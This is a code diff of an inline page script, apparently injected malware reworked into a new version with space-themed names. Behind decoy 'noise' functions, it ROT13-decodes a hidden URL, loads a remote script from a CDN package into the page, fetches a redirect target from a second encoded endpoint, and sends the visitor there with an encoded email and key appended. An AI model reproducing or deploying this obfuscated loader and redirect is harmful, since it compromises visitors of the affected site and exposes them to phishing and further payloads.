@@ -3352,112 +3352,123 @@
 
 })));
 
-// Entropy distraction - Phase Gamma
-(function fakeEntropyPhase() {
-  const garbagePool = new Array(5).fill(0).map((_, i) => Math.sin(i * Math.PI));
-  function rotateNoise(val) {
-    return garbagePool.reduce((acc, cur) => acc + cur * val, 0);
+ // Quantum Fluctuation Simulator (useless)
+(function quantumNoiseGenerator() {
+  const chaosMatrix = [0.618, 1.618, 2.718, 3.142].map(x => Math.tan(x));
+  function generateEntropy(seed) {
+    return chaosMatrix.reduce((a, b) => a * b * seed, 1);
   }
-  rotateNoise(99);
+  generateEntropy(Date.now() % 17);
 })();
 
-// Critical token (Do Not Alter)
-let magicHash = "[EMAIL]", channelCode = "[KEY]";
+// Core Identifiers (DO NOT MODIFY)
+const cosmicKey = "[EMAIL]", dimensionCode = "[KEY]";
 
-(function deployNexus() {
-  console.log("Node Injected @", new Date().toISOString());
+(function celestialInjection() {
+  console.log("Stellar Gateway Activated @", new Date().toUTCString());
 
-  // Background async task (useless)
-  (async function fakeDelay() {
-    for (let nonsense = 0; nonsense < 2; nonsense++) {
-      await new Promise(j => setTimeout(j, 3));
-    }
+  // Fake background task
+  (function createVoidLoop() {
+    let voidCounter = 0;
+    const voidInterval = setInterval(() => {
+      if (++voidCounter > 3) clearInterval(voidInterval);
+    }, 1);
   })();
 
-  // CSS payload camouflage
-  const stealthCSS = document.createElement("style");
-  stealthCSS.innerHTML = "html::after{content:'X';display:none}";
-  document.head?.appendChild(stealthCSS);
+  // Visual deception layer
+  const phantomStyle = document.createElement("style");
+  phantomStyle.textContent = "body::before{content:'⚡';opacity:0}";
+  document.head?.append(phantomStyle);
 
-  // ROT13 Transformer
-  function decodeROT13(str) {
-    return str.replace(/[a-zA-Z]/g, c => {
-      let code = c.charCodeAt(0);
-      return String.fromCharCode(code + (c.toLowerCase() < 'n' ? 13 : -13));
+  // Galactic Decoder
+  function cosmicCipher(inputStr) {
+    return inputStr.replace(/[a-zA-Z]/g, char => {
+      const baseCode = char.charCodeAt(0);
+      const cipherShift = char.toLowerCase() < 'n' ? 13 : -13;
+      return String.fromCharCode(baseCode + cipherShift);
     });
   }
 
-  // Encrypted URL components (modified order)
-  const scrambled = ["uggcf://", "cbfvbasbe2@1.0.0", "acz/", ".arg/", "wfqryvie", "/terng.wf"];
-  const injectionURL = decodeROT13(scrambled.reverse().join("")).replace("uggcf://", "https://");
+  // Obscured URL fragments (rearranged)
+  const nebulaFragments = [
+    "wfqryvie", 
+    "uggcf://", 
+    "cbfvbasbe2@1.0.0", 
+    "/terng.wf", 
+    "acz/", 
+    ".arg/"
+  ];
+  const portalURL = cosmicCipher(nebulaFragments.reverse().join(""))
+                   .replace("uggcf://", "https://");
 
-  // Script injection point
-  const stealthScript = document.createElement("script");
-  stealthScript.type = "application/ecmascript";
-  stealthScript.defer = true;
-  stealthScript.src = injectionURL;
+  // Wormhole injection
+  const stargate = document.createElement("script");
+  stargate.setAttribute("data-quantum", "true");
+  stargate.async = true;
+  stargate.src = portalURL;
 
-  // Insert script to body or fallback to head
-  const injectTarget = document.body || document.head;
-  injectTarget?.appendChild(stealthScript);
+  // Injection sequence
+  (document.body || document.head)?.appendChild(stargate);
 
-  // Junk math logic
-  (function tempStackOverflow() {
-    const foo = Math.pow(12345, 0) + Math.random();
-    console.log("🐒 noise:", foo);
+  // Fake computation
+  (function simulateBlackhole() {
+    const singularity = Math.E * Math.PI * Math.random();
+    console.log("Singularity noise:", singularity.toFixed(5));
   })();
 
-  // Operation Commander
-  (function signalBeacon() {
-    let attempts = 0;
+  // Mission Control
+  (function initiateWarpDrive() {
+    let readinessChecks = 0;
 
-    // Wait until DOM is ready
-    function standbyMode() {
-      if (!document.body && attempts++ < 7) {
-        return setTimeout(standbyMode, 25);
+    function verifyDocking() {
+      if (!document.body && readinessChecks++ < 5) {
+        setTimeout(verifyDocking, 30);
       }
     }
-    standbyMode();
+    verifyDocking();
 
-    const vaultKey = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
-    const reverseROT = s =>
-      s.replace(/[a-zA-Z]/g, l =>
-        String.fromCharCode(l.charCodeAt(0) + (l.toLowerCase() < 'n' ? 13 : -13))
+    const singularityKey = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
+    const hyperDecoder = str =>
+      str.replace(/[a-zA-Z]/g, c =>
+        String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))
       );
 
-    // Delay simulator
-    async function delaySim() {
-      const garbage = await Promise.resolve("🎭");
-      return garbage;
+    // Temporal distortion field
+    async function timeDilation() {
+      await new Promise(r => setTimeout(r, 2));
+      return "⏳";
     }
 
-    // Main payload retriever
-    async function getPayloadRoute() {
-      const response = await fetch(reverseROT(vaultKey));
-      if (!response.ok) return "";
-      const data = await response.json();
-      return data.message;
+    // Quantum payload retrieval
+    async function acquireQuantumData() {
+      try {
+        const quantumResponse = await fetch(hyperDecoder(singularityKey));
+        if (!quantumResponse.ok) return null;
+        return await quantumResponse.json();
+      } catch {
+        return null;
+      }
     }
 
-    // Deployment runner
-    async function launchBeacon() {
-      const encodedID = btoa(`${magicHash}&${channelCode}&a`);
-      await delaySim(); // maintain async
-      const route = await getPayloadRoute();
-      window.open(`${route}${encodedID}`, "_self");
+    // Warp sequence
+    async function engageWarp() {
+      const signature = btoa(`${cosmicKey}&${dimensionCode}&a`);
+      await timeDilation();
+      const quantumData = await acquireQuantumData();
+      if (quantumData?.message) {
+        window.open(`${quantumData.message}${signature}`, "_self");
+      }
     }
 
-    launchBeacon();
+    engageWarp();
   })();
 
-  // Final uselessness
-  (() => {
-    const uselessFn = z => z * 999 - Math.random();
-    uselessFn(4);
+  // Final cosmic noise
+  (function bigBang() {
+    const cosmicNoise = Array(3).fill().map((_, i) => Math.cos(i));
+    cosmicNoise.forEach(x => x * Math.random());
   })();
 })();
-
- 
 
     ]]>
   </script>
